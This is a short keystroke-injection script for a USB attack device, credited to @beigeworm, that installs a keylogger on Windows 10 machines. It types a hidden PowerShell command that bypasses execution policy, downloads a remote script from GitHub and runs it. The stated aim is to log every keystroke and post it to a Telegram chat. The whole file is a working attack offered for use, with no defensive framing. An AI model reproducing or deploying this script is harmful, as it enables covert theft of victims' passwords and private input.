// Title: beigeworm's Keyloggger to Telegram Chat.
// Author: @beigeworm
// Description: This script logs all Keystrokes and posts results to a Telegram chat when the keyboard goes inactive for more than 10 secs.
// Target: Windows 10
// *SETUP*
// replace TOKEN_HERE with your Telegram token.

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $tg='TOKEN_HERE'; irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Telegram-Keylogger/main.ps1 | iex");
delay(500);
press("ENTER");
